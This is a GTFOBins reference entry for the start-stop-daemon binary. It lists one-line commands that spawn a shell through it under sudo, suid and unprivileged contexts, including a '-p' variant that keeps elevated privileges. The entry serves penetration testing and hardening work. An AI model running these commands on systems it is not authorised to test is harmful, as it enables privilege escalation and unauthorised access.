<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/start-stop-daemon -->
---
functions:
  shell:
  - code: |-
      start-stop-daemon -S -x /bin/sh
    contexts:
      sudo:
      suid:
        code: |-
          start-stop-daemon -S -x /bin/sh -- -p
        shell: false
      unprivileged:
...
